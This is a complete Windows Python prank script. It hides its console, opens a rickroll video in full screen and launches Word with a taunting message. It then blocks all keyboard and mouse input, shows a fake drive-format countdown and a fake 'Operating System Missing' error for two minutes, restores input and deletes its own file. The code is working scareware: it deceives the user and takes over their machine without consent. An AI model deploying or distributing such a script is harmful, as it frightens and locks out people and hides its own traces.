import os
import sys
import time
import ctypes
import subprocess
import pyautogui
import webbrowser

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def disable_input():
    ctypes.windll.user32.BlockInput(True)

def enable_input():
    ctypes.windll.user32.BlockInput(False)

def play_youtube_video(url):
    webbrowser.open(url)
    time.sleep(1)
    pyautogui.hotkey('ctrl', 'l')
    pyautogui.typewrite(url)
    pyautogui.press('enter')
    time.sleep(3)
    pyautogui.press('f')

def open_word_and_type():
    subprocess.Popen(["start", "winword"], shell=True)
    time.sleep(3)
    pyautogui.typewrite("Alright buddy, let me cook...\n")
    time.sleep(2)
    disable_input()

def fake_format():
    subprocess.Popen("cmd /c echo Formatting drive C:... && timeout /t 5 && echo 10%%... && timeout /t 2 && echo 25%%... && timeout /t 2 && echo 50%%... && timeout /t 3 && echo 75%%... && timeout /t 2 && echo 100%%... && echo Format complete.", shell=True)

def show_fake_error():
    os.system("cls")
    print("\n\n\n\n\n")
    print(" " * 20 + "💀 SYSTEM ERROR 💀")
    print(" " * 20 + "Operating System Missing or Damaged.")
    print(" " * 20 + "Restart Required.")
    print("\n" * 5)
    time.sleep(120)

def restore_and_self_destruct():
    enable_input()
    os.system("cls")
    print("JUST KIDDING. HONK! 🦢")
    time.sleep(3)
    script_path = sys.argv[0]
    try:
        os.remove(script_path)
    except Exception as e:
        print(f"Failed to self-delete: {e}")

if __name__ == "__main__":
    hide_console()
    youtube_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"  

    print("Playing YouTube video...")
    play_youtube_video(youtube_url)
    
    time.sleep(10)  

    open_word_and_type()

    time.sleep(2)
    fake_format()
    time.sleep(5)
    
    show_fake_error()
    restore_and_self_destruct()
